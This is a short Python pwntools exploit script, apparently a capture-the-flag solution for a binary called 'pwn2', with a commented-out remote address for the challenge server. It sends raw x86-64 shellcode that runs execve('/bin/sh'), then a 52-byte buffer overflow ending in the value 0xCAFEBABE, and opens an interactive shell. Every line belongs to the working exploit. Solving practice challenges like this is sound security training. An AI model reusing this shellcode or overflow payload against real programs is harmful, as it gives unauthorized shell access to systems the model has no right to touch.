from pwn import *

p = process("./pwn2")
# p = remote("14.225.255.41", 13333)
p.recvuntil("Enter your name: ")
shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

payload = shellcode
p.sendline(payload)
payload = b"a"*52 + p32(0xCAFEBABE)

p.sendline(payload)
p.interactive()